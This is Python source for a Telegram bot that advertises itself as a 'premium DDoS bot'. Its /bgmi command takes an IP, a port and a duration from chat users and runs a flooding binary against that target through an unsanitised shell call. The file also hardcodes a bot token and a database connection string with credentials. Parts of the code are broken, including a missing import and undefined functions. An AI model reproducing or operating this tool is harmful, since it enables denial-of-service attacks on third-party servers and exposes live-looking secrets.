
import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread


TOKEN = "7835601263:AAEoRs1IntxsVvEWwHeGoFmBT0pSI"
MONGO_URI = 'mongodb+srv://VENOM:VENOM@venom.xgrna.mongodb.net/?retryWrites=true&w=majority&appName=VENOM'
FORWARD_CHANNEL_ID = -1002155211034
CHANNEL_ID = -1002155211034
error_channel_id = -1002155211034

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['VENOM']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

running_processes = []


REMOTE_HOST = '0.0.0.0/0'  
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./bgmi {target_ip} {target_port} {duration} 70"
    
    response = f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙎𝙚𝙣𝙩 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 🚀\n\n𝙏𝙖𝙧𝙜𝙚𝙩: {target}\n𝙏𝙞𝙢𝙚: {time} 𝙎𝙚𝙘𝙤𝙣𝙙𝙨\n Owner - @Venompapano1"
    bot.reply_to(message, response)


# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    command = message.text.split()
    if len(command) == 4:  # Expecting <IP> <PORT> <TIME>
        target = command[1]
        port = int(command[2])  # Convert port to integer
        time = int(command[3])  # Convert time to integer
        if time > 240:
            response = "🔴 𝙀𝙧𝙧𝙤𝙧: 𝙐𝙨𝙚 𝙡𝙚𝙨𝙨 𝙩𝙝𝙖𝙣 240 𝙎𝙚𝙘𝙤𝙣𝙙𝙨"
        else:
            start_attack_reply(message, target, port, time)  # Call your function here
            full_command = f"./bgmi {target} {port} {time} 20"
            process = subprocess.run(full_command, shell=True)
            response = "𝘼𝙩𝙩𝙖𝙘𝙠 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙\n Owner - @SOOPERMANX 🔥"
    else:
        response = "✅ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙥𝙧𝙤𝙫𝙞𝙙𝙚 <𝙄𝙋> <𝙋𝙊𝙍𝙏> <𝙏𝙄𝙈𝙀>"  # Updated command syntax

    bot.reply_to(message, response)



@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''🔰 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧 🔰\n Owner - @SOOPERMANX '''
    bot.reply_to(message, response)




   




@bot.message_handler(commands=['check'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''𝗡𝗼𝘄 𝗦𝘁𝗮𝗿𝘁 𝘁𝗵𝗲 𝗺𝗮𝘁𝗰𝗵
'''


    bot.reply_to(message, response)




#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


